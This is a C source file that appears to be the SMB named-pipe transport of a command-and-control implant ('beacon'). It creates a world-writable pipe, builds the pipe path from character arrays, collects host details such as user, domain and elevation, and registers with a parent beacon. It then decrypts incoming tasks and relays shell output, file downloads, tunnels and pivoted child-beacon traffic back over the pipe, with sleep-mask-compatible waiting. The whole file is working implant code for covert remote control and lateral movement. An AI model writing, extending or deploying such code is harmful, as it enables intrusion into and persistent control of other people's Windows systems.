/* beacon/src/Transport/Smb.c
 * Child-side SMB named pipe transport.
 * Creates a pipe server, waits for parent to connect, then enters an
 * event-driven loop using WaitForMultipleObjects for sleepmask compat.
 *
 * Build with: make NAX_TRANSPORT_PROFILE=1 */

#include "Nax.h"
#include "Config.h"
#include "Transport.h"
#include "Pipe.h"

/* ========= [ permissive DACL - Everyone RW ] ========= */

FUNC static BOOL SmbBuildPermissiveDacl( PNAX_INSTANCE Nax, PSECURITY_DESCRIPTOR pSD, PACL* ppAcl ) {
    if ( ! Nax->Advapi32.InitializeSecurityDescriptor( pSD, SECURITY_DESCRIPTOR_REVISION ) )
        return FALSE;

    SID_IDENTIFIER_AUTHORITY worldAuth = SECURITY_WORLD_SID_AUTHORITY;
    PSID pEveryoneSid = NULL;
    if ( ! Nax->Advapi32.AllocateAndInitializeSid( &worldAuth, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pEveryoneSid ) )
        return FALSE;

    EXPLICIT_ACCESS_A ea;
    MmZero( &ea, sizeof( ea ) );
    ea.grfAccessPermissions = GENERIC_READ | GENERIC_WRITE;
    ea.grfAccessMode        = SET_ACCESS;
    ea.grfInheritance       = NO_INHERITANCE;
    ea.Trustee.TrusteeForm  = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType  = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName    = (LPSTR)pEveryoneSid;

    if ( Nax->Advapi32.SetEntriesInAclA( 1, &ea, NULL, ppAcl ) != ERROR_SUCCESS ) {
        Nax->Advapi32.FreeSid( pEveryoneSid );
        return FALSE;
    }

    Nax->Advapi32.FreeSid( pEveryoneSid );

    if ( ! Nax->Advapi32.SetSecurityDescriptorDacl( pSD, TRUE, *ppAcl, FALSE ) )
        return FALSE;

    return TRUE;
}

/* ========= [ SMB transport helpers ] ========= */

FUNC static BOOL SmbSendResult( PNAX_INSTANCE Nax, UINT32 tid, BYTE status, const PBYTE data, UINT32 data_len, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
    UINT32 frame_len = frame_cap;
    if ( NaxBuildResult( tid, status, data, data_len, frame, &frame_len ) != NAX_OK ) return TRUE;
    UINT32 env_len = env_cap;
    if ( NaxEncrypt( Nax, frame, frame_len, env, &env_len ) != NAX_OK ) return TRUE;
    return NaxPipeWrite( Nax, hPipe, hWriteEvent, env, env_len );
}

FUNC static BOOL SmbRelayPivots( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent, BOOL* pDataRelayed ) {
    UINT32 piv_len = NaxProcessPivots( Nax, result, result_cap );
    *pDataRelayed = ( piv_len > 0 );
    PBYTE  piv_cur = result;
    UINT32 piv_rem = piv_len;
    while ( piv_rem >= 4 ) {
        UINT32 entryLen = *(UINT32*)piv_cur;
        if ( entryLen == 0 || 4 + entryLen > piv_rem ) break;
        if ( ! SmbSendResult( Nax, 0, NAX_STATUS_OK, piv_cur + 4, entryLen, frame, frame_cap, env, env_cap, hPipe, hWriteEvent ) )
            return FALSE;
        piv_cur += 4 + entryLen;
        piv_rem -= 4 + entryLen;
    }
    if ( piv_len > 0 )
        NaxDbg( Nax, "[pivot] relayed %u bytes of grandchild data", piv_len );
    return TRUE;
}

FUNC static BOOL SmbRelayJobs( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
    UINT32 job_len = NaxProcessJobs( Nax, result, result_cap );
    UINT32 joff = 0;
    while ( joff + 9 <= job_len ) {
        BYTE   jtype = result[ joff ];
        UINT32 jtid  = NaxR32( result + joff + 1 );
        UINT32 jdata = NaxR32( result + joff + 5 );
        if ( joff + 9 + jdata > job_len ) break;
        if ( ! SmbSendResult( Nax, jtid, jtype, result + joff + 9, jdata, frame, frame_cap, env, env_cap, hPipe, hWriteEvent ) )
            return FALSE;
        joff += 9 + jdata;
    }
    return TRUE;
}

FUNC static BOOL SmbRelayShells( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
    UINT32 sh_len = NaxProcessShells( Nax, result, result_cap );
    UINT32 soff = 0;
    while ( soff + 9 <= sh_len ) {
        BYTE   stype = result[ soff ];
        UINT32 stid  = NaxR32( result + soff + 1 );
        UINT32 sdata = NaxR32( result + soff + 5 );
        if ( soff + 9 + sdata > sh_len ) break;
        if ( ! SmbSendResult( Nax, stid, stype, result + soff + 9, sdata, frame, frame_cap, env, env_cap, hPipe, hWriteEvent ) )
            return FALSE;
        soff += 9 + sdata;
    }
    return TRUE;
}

FUNC static BOOL SmbRelayDownloads( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
    UINT32 dl_len = NaxProcessDownloads( Nax, result, result_cap );
    UINT32 doff = 0;
    while ( doff + 8 <= dl_len ) {
        UINT32 tid  = NaxR32( result + doff );
        UINT32 dlen = NaxR32( result + doff + 4 );
        if ( doff + 8 + dlen > dl_len ) break;
        if ( ! SmbSendResult( Nax, tid, NAX_STATUS_OK, result + doff + 8, dlen, frame, frame_cap, env, env_cap, hPipe, hWriteEvent ) )
            return FALSE;
        doff += 8 + dlen;
    }
    return TRUE;
}

FUNC static BOOL SmbTunnelActive( PNAX_INSTANCE Nax ) {
    NAX_TUNNEL* t = Nax->TunnelHead;
    while ( t ) {
        if ( t->Mode == NAX_TUNNEL_MODE_TCP )
            return TRUE;
        t = t->Next;
    }
    return FALSE;
}

FUNC static BOOL SmbRelayTunnels( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent, BOOL* pDataRelayed ) {
    UINT32 tun_len = NaxProcessTunnels( Nax, result, result_cap );
    *pDataRelayed = ( tun_len > 0 );
    if ( tun_len == 0 ) return TRUE;
    return SmbSendResult( Nax, 0, NAX_STATUS_TUNNEL, result, tun_len, frame, frame_cap, env, env_cap, hPipe, hWriteEvent );
}

FUNC static BOOL SmbDoRegister( PNAX_INSTANCE Nax, PNAX_SYSINFO info, PBYTE frame_buf, UINT32 frame_cap, PBYTE env_buf, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
    BYTE   reg_body[NAX_REG_BODY_BUF]; UINT32 reg_body_len = NAX_REG_BODY_BUF;
    if ( NaxBuildRegBody( info->Hostname, info->HnLen, info->Username, info->UnLen, NAX_ARCH_X64, info->Pid, Nax->Config.SleepMs, info->Tid, info->IpStr, info->IpLen, info->Domain, info->DmLen, info->Procname, info->PnLen, Nax->Elevated, Nax->OsMajor, Nax->OsMinor, Nax->OsBuild, Nax->ParentPid, Nax->Acp, Nax->OemCp, Nax->ImgPath, info->ImLen, reg_body, &reg_body_len ) != NAX_OK ) {
        NaxDbg( Nax, "NaxBuildRegBody failed" );
        return FALSE;
    }

    UINT32 frame_len = frame_cap;
    if ( NaxFrameEncode( NAX_WIRE_REGISTER, reg_body, reg_body_len, frame_buf, &frame_len ) != NAX_OK ) {
        NaxDbg( Nax, "NaxFrameEncode REGISTER failed" );
        return FALSE;
    }

    UINT32 env_len = env_cap;
    if ( NaxEncrypt( Nax, frame_buf, frame_len, env_buf, &env_len ) != NAX_OK ) {
        NaxDbg( Nax, "NaxEncrypt REGISTER failed" );
        return FALSE;
    }

    UINT32 beatLen = 4 + NAX_SID_LEN - 1 + env_len;
    PBYTE  beatBuf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, beatLen );
    if ( ! beatBuf ) {
        NaxDbg( Nax, "heap alloc beat failed" );
        return FALSE;
    }
    *(UINT32*)beatBuf = Nax->Config.ListenerWm;
    MmCopy( beatBuf + 4, Nax->SessionId, NAX_SID_LEN - 1 );
    MmCopy( beatBuf + 4 + NAX_SID_LEN - 1, env_buf, env_len );

    BOOL beatOk = NaxPipeWrite( Nax, hPipe, hWriteEvent, beatBuf, beatLen );
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, beatBuf );
    if ( ! beatOk ) {
        NaxDbg( Nax, "NaxPipeWrite REGISTER failed" );
        return FALSE;
    }
    NaxDbg( Nax, "REGISTER beat sent (%u bytes)", beatLen );
    return TRUE;
}

FUNC static BOOL SmbSendHeartbeat( PNAX_INSTANCE Nax, PBYTE frame_buf, UINT32 frame_cap, PBYTE env_buf, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
    UINT32 frame_len = frame_cap;
    if ( NaxBuildHeartbeat( frame_buf, &frame_len ) != NAX_OK ) return TRUE;
    UINT32 env_len = env_cap;
    if ( NaxEncrypt( Nax, frame_buf, frame_len, env_buf, &env_len ) != NAX_OK ) return TRUE;
    if ( ! NaxPipeWrite( Nax, hPipe, hWriteEvent, env_buf, env_len ) ) {
        NaxDbg( Nax, "HEARTBEAT write failed" );
        return FALSE;
    }
    NaxDbg( Nax, "HEARTBEAT sent" );
    return TRUE;
}

FUNC static BOOL SmbHandleParentData( PNAX_INSTANCE Nax, BOOL rdOk, OVERLAPPED* ovRead, DWORD* nRead, UINT32 hdrBuf, HANDLE hPipe, HANDLE hReadEvent, HANDLE hWriteEvent, PBYTE io_buf, UINT32 io_cap, PBYTE plain_buf, PBYTE result_buf, UINT32 result_cap, PBYTE frame_buf, UINT32 frame_cap, PBYTE env_buf, UINT32 env_cap );

FUNC static BOOL SmbDispatchTasks( PNAX_INSTANCE Nax, PBYTE plain_buf, UINT32 plain_len, PBYTE result_buf, UINT32 result_cap, PBYTE frame_buf, UINT32 frame_cap, PBYTE env_buf, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent ) {
    PBYTE  cursor    = plain_buf;
    UINT32 remaining = plain_len;

    while ( remaining >= NAX_FRAME_HDR ) {
        BYTE   ft = 0; PBYTE fb = NULL; UINT32 fbl = 0;
        if ( NaxFrameDecode( cursor, remaining, &ft, &fb, &fbl ) != NAX_OK ) break;

        UINT32 step = NAX_FRAME_HDR + fbl;
        if ( step > remaining ) break;
        cursor    += step;
        remaining -= step;

        if ( ft == NAX_WIRE_NO_TASKS ) break;
        if ( ft != NAX_WIRE_TASK ) continue;

        NAX_TASK task;
        if ( NaxDecodeTask( fb, fbl, &task ) != NAX_OK ) {
            NaxDbg( Nax, "[task] decode FAILED fbl=%u", fbl );
            continue;
        }
        NaxDbg( Nax, "[task] cmd=0x%02x id=0x%08x argsLen=%u", task.CmdId, task.TaskId, task.ArgsLen );

        UINT32 r_tid  = 0;
        BYTE   r_stat = 0;
        UINT32 r_len  = result_cap;

        if ( ! NaxDispatch( Nax, &task, &r_tid, &r_stat, result_buf, &r_len ) ) {
            NaxDbg( Nax, "[task] cmd=0x%02x: no result (exit)", task.CmdId );
            continue;
        }

        NaxDbg( Nax, "[task] cmd=0x%02x done: stat=0x%02x r_len=%u", task.CmdId, r_stat, r_len );

        if ( ! SmbSendResult( Nax, r_tid, r_stat, result_buf, r_len, frame_buf, frame_cap, env_buf, env_cap, hPipe, hWriteEvent ) ) {
            NaxDbg( Nax, "[task] result write failed" );
            return FALSE;
        }
        NaxDbg( Nax, "[task] result sent" );
    }
    return TRUE;
}

FUNC static BOOL SmbHandleParentData( PNAX_INSTANCE Nax, BOOL rdOk, OVERLAPPED* ovRead, DWORD* nRead, UINT32 hdrBuf, HANDLE hPipe, HANDLE hReadEvent, HANDLE hWriteEvent, PBYTE io_buf, UINT32 io_cap, PBYTE plain_buf, PBYTE result_buf, UINT32 result_cap, PBYTE frame_buf, UINT32 frame_cap, PBYTE env_buf, UINT32 env_cap ) {
    if ( ! rdOk && ! NaxPipeWaitOv( Nax, hPipe, ovRead, nRead ) ) {
        NaxDbg( Nax, "GetOverlappedResult header failed" );
        return FALSE;
    }

    UINT32 msgLen = hdrBuf;
    if ( msgLen == 0 || msgLen > io_cap ) {
        NaxDbg( Nax, "invalid msg len: %u", msgLen );
        return FALSE;
    }

    if ( ! NaxPipeRead( Nax, hPipe, hReadEvent, io_buf, msgLen ) ) {
        NaxDbg( Nax, "NaxPipeRead body failed" );
        return FALSE;
    }

    UINT32 plain_len = io_cap;
    if ( NaxDecrypt( Nax, io_buf, msgLen, plain_buf, &plain_len ) != NAX_OK ) {
        NaxDbg( Nax, "NaxDecrypt failed" );
        return TRUE;
    }

    return SmbDispatchTasks( Nax, plain_buf, plain_len, result_buf, result_cap, frame_buf, frame_cap, env_buf, env_cap, hPipe, hWriteEvent );
}

/* ========= [ NaxSmbMain - child beacon pipe transport ] ========= */

FUNC VOID NaxSmbMain( PNAX_INSTANCE Nax ) {
    /* ---- build pipe path: \\.\pipe\<pipename> ---- */
    CHAR pipePrefix[] = { '\\', '\\', '.', '\\', 'p', 'i', 'p', 'e', '\\', '\0' };
    CHAR pipePath[256];
    MmZero( pipePath, 256 );

    UINT32 pfx_len = 0;
    while ( pipePrefix[pfx_len] ) pfx_len++;

    UINT32 name_len = 0;
    while ( Nax->Config.C2Url[name_len] ) name_len++;

    if ( pfx_len + name_len >= 256 ) return;
    MmCopy( pipePath, pipePrefix, pfx_len );
    MmCopy( pipePath + pfx_len, Nax->Config.C2Url, name_len );
    pipePath[pfx_len + name_len] = '\0';

    NaxDbg( Nax, "SMB pipe: %s", pipePath );

    /* ---- build permissive DACL ---- */
    SECURITY_DESCRIPTOR sd;
    PACL                pAcl = NULL;
    SECURITY_ATTRIBUTES sa;
    MmZero( &sd, sizeof( sd ) );
    MmZero( &sa, sizeof( sa ) );

    if ( ! SmbBuildPermissiveDacl( Nax, &sd, &pAcl ) ) {
        NaxDbg( Nax, "DACL build failed" );
        return;
    }
    sa.nLength              = sizeof( SECURITY_ATTRIBUTES );
    sa.lpSecurityDescriptor = &sd;
    sa.bInheritHandle       = FALSE;

    /* ---- create named pipe ---- */
    HANDLE hPipe = Nax->Kernel32.CreateNamedPipeA(
        pipePath,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        1,
        NAX_PIPE_BUF_SIZE,
        NAX_PIPE_BUF_SIZE,
        0,
        &sa
    );
    if ( hPipe == INVALID_HANDLE_VALUE ) {
        NaxDbg( Nax, "CreateNamedPipeA failed: %u", Nax->Kernel32.GetLastError() );
        if ( pAcl ) Nax->Kernel32.GlobalFree( pAcl );
        return;
    }

    /* ---- create events ---- */
    HANDLE hConnEvent  = Nax->Kernel32.CreateEventA( NULL, TRUE, FALSE, NULL );
    HANDLE hReadEvent  = Nax->Kernel32.CreateEventA( NULL, TRUE, FALSE, NULL );
    HANDLE hWriteEvent = Nax->Kernel32.CreateEventA( NULL, TRUE, FALSE, NULL );
    if ( ! hConnEvent || ! hReadEvent || ! hWriteEvent ) {
        NaxDbg( Nax, "CreateEventA failed" );
        Nax->Kernel32.CloseHandle( hPipe );
        if ( pAcl ) Nax->Kernel32.GlobalFree( pAcl );
        return;
    }

    /* ---- heap-allocate I/O buffers ---- */
    UINT32 IO_CAP     = NAX_IO_CAP;
    UINT32 RESULT_CAP = NAX_IO_CAP;
    UINT32 FRAME_CAP  = RESULT_CAP + 256;

    PBYTE io_buf     = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, IO_CAP );
    PBYTE plain_buf  = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, IO_CAP );
    PBYTE result_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, RESULT_CAP );
    PBYTE frame_buf  = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, FRAME_CAP );
    PBYTE env_buf    = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, FRAME_CAP );
    if ( ! io_buf || ! plain_buf || ! result_buf || ! frame_buf || ! env_buf ) {
        NaxDbg( Nax, "heap alloc failed" );
        Nax->Kernel32.CloseHandle( hPipe );
        if ( pAcl ) Nax->Kernel32.GlobalFree( pAcl );
        return;
    }

    /* ---- session id ---- */
    BYTE raw[8];
    Nax->Bcrypt.BCryptGenRandom( NULL, raw, 8, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
    NaxHexEncode( raw, 8, Nax->SessionId );
    NaxDbg( Nax, "session: %s", Nax->SessionId );

    /* ======== outer loop - accept connections ======== */
    for ( ;; ) {
        NaxDbg( Nax, "waiting for parent connection..." );

        OVERLAPPED ovConn;
        MmZero( &ovConn, sizeof( ovConn ) );
        ovConn.hEvent = hConnEvent;
        Nax->Kernel32.ResetEvent( hConnEvent );

        BOOL connOk = Nax->Kernel32.ConnectNamedPipe( hPipe, &ovConn );
        if ( ! connOk ) {
            DWORD err = Nax->Kernel32.GetLastError();
            if ( err == ERROR_IO_PENDING ) {
                DWORD wr = Nax->Kernel32.WaitForSingleObject( hConnEvent, INFINITE );
                if ( wr != WAIT_OBJECT_0 ) {
                    Nax->Kernel32.CancelIo( hPipe );
                    continue;
                }
            } else if ( err != ERROR_PIPE_CONNECTED ) {
                NaxDbg( Nax, "ConnectNamedPipe failed: %u", err );
                Nax->Kernel32.Sleep( Nax->Config.SleepMs );
                continue;
            }
        }
        NaxDbg( Nax, "parent connected" );

        /* gather fresh sysinfo per connection */
        NAX_SYSINFO info;
        NaxGatherSysInfo( Nax, &info );

        /* register with parent */
        if ( ! SmbDoRegister( Nax, &info, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent ) ) {
            Nax->Kernel32.FlushFileBuffers( hPipe );
            Nax->Kernel32.DisconnectNamedPipe( hPipe );
            NaxDbg( Nax, "parent disconnected (register failed), re-entering accept loop" );
            continue;
        }

        /* ======== inner loop - task processing ======== */
        BOOL   pipe_ok          = TRUE;
        BOOL   justSentOutput   = FALSE;
        UINT32 pivotPollCount   = 0;
        UINT64 lastActivityTick = 0;
        while ( pipe_ok ) {
            UINT32     hdrBuf = 0;
            OVERLAPPED ovRead;
            MmZero( &ovRead, sizeof( ovRead ) );
            ovRead.hEvent = hReadEvent;
            Nax->Kernel32.ResetEvent( hReadEvent );
            DWORD nRead = 0;
            BOOL  rdOk  = Nax->Kernel32.ReadFile( hPipe, &hdrBuf, 4, &nRead, &ovRead );

            if ( ! rdOk && Nax->Kernel32.GetLastError() != ERROR_IO_PENDING ) {
                NaxDbg( Nax, "ReadFile header failed: %u", Nax->Kernel32.GetLastError() );
                pipe_ok = FALSE;
                break;
            }

            /* arm pivot child reads */
            NAX_PIVOT* _pv = Nax->PivotHead;
            while ( _pv ) {
                NaxPostPivotHeaderRead( Nax, _pv );
                _pv = _pv->Next;
            }

            BOOL hasOutput = justSentOutput
                          || ( Nax->DownloadHead != NULL )
                          || ( Nax->JobHead != NULL )
                          || ( Nax->ShellHead != NULL );
            justSentOutput = FALSE;

            HANDLE waitHandles[64];
            DWORD  handleCount = 0;
            waitHandles[handleCount++] = hReadEvent;
            _pv = Nax->PivotHead;
            while ( _pv && handleCount < 64 ) {
                if ( _pv->Async->RdPending )
                    waitHandles[handleCount++] = _pv->Async->OvRead.hEvent;
                _pv = _pv->Next;
            }
            if ( Nax->JobWakeEvent && handleCount < 64 )
                waitHandles[handleCount++] = Nax->JobWakeEvent;
            if ( Nax->TunnelEvent && handleCount < 64 )
                waitHandles[handleCount++] = Nax->TunnelEvent;

            UINT32 sleepMs  = NaxEffectiveSleep( Nax );
            BOOL   idleWait = FALSE;
            DWORD  wfmo_timeout;
            if ( hasOutput ) {
                wfmo_timeout = 0;
            } else if ( pivotPollCount > 0 ) {
                wfmo_timeout = 100;
                pivotPollCount--;
            } else if ( SmbTunnelActive( Nax ) ) {
                wfmo_timeout = 100;
                idleWait     = TRUE;
            } else if ( lastActivityTick && ( Nax->Kernel32.GetTickCount64() - lastActivityTick ) < 5000 ) {
                wfmo_timeout = 100;
            } else {
                wfmo_timeout = sleepMs ? sleepMs : INFINITE;
                idleWait     = TRUE;
            }
            DWORD  wait = Nax->Kernel32.WaitForMultipleObjects( handleCount, waitHandles, FALSE, wfmo_timeout );

            if ( wait == WAIT_OBJECT_0 ) {
                pipe_ok = SmbHandleParentData( Nax, rdOk, &ovRead, &nRead, hdrBuf, hPipe, hReadEvent, hWriteEvent, io_buf, IO_CAP, plain_buf, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP );
            } else if ( wait == WAIT_TIMEOUT || ( wait > WAIT_OBJECT_0 && wait < WAIT_OBJECT_0 + handleCount ) ) {
                Nax->Kernel32.CancelIo( hPipe );
                DWORD nHdr = 0;
                if ( Nax->Kernel32.GetOverlappedResult( hPipe, &ovRead, &nHdr, FALSE ) && nHdr == 4 && hdrBuf > 0 )
                    pipe_ok = SmbHandleParentData( Nax, TRUE, &ovRead, &nHdr, hdrBuf, hPipe, hReadEvent, hWriteEvent, io_buf, IO_CAP, plain_buf, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP );
                else if ( wait == WAIT_TIMEOUT && idleWait )
                    pipe_ok = SmbSendHeartbeat( Nax, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent );
            } else {
                NaxDbg( Nax, "WaitForMultipleObjects unexpected: %u", wait );
                pipe_ok = FALSE;
            }

            if ( ! pipe_ok ) break;

            /* Snapshot DataSent BEFORE SmbRelayPivots → NaxProcessPivots
             * clears it.  Without this, CmdPivotExec's flag is consumed
             * inside NaxProcessPivots and the fast-poll path never fires,
             * causing a full sleepMs delay before child results are read. */
            BOOL anyPivotDataSent = FALSE;
            _pv = Nax->PivotHead;
            while ( _pv ) {
                if ( _pv->Async->DataSent )
                    anyPivotDataSent = TRUE;
                _pv = _pv->Next;
            }

            BOOL dataRelayed = FALSE;
            if ( Nax->PivotHead )
                pipe_ok = SmbRelayPivots( Nax, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent, &dataRelayed );

            if ( pipe_ok && Nax->DownloadHead )
                pipe_ok = SmbRelayDownloads( Nax, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent );

            if ( pipe_ok && Nax->JobHead )
                pipe_ok = SmbRelayJobs( Nax, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent );

            if ( pipe_ok && Nax->ShellHead )
                pipe_ok = SmbRelayShells( Nax, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent );

            if ( Nax->JobWakeEvent )
                Nax->Kernel32.ResetEvent( Nax->JobWakeEvent );

            BOOL tunnelRelayed = FALSE;
            if ( pipe_ok && Nax->TunnelHead ) {
                pipe_ok = SmbRelayTunnels( Nax, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent, &tunnelRelayed );
                if ( Nax->TunnelEvent && Nax->Ws2.WSAResetEvent )
                    Nax->Ws2.WSAResetEvent( Nax->TunnelEvent );
            }

            if ( anyPivotDataSent || dataRelayed || tunnelRelayed )
                justSentOutput = TRUE;
            if ( justSentOutput ) {
                pivotPollCount   = 5;
                lastActivityTick = Nax->Kernel32.GetTickCount64();
            }
        }

        Nax->Kernel32.FlushFileBuffers( hPipe );
        Nax->Kernel32.DisconnectNamedPipe( hPipe );
        NaxDbg( Nax, "parent disconnected, re-entering accept loop" );
    }
}

/* ========= [ NaxSmbPost stub - satisfies linker for HTTP builds ] ========= */

FUNC INT NaxSmbPost( PNAX_INSTANCE Nax, const PWCHAR pipe_path, const PCHAR sid,
                     const PBYTE body, UINT32 body_len,
                     PBYTE resp_buf, UINT32* resp_len ) {
    return NAX_ERR_INVAL;
}
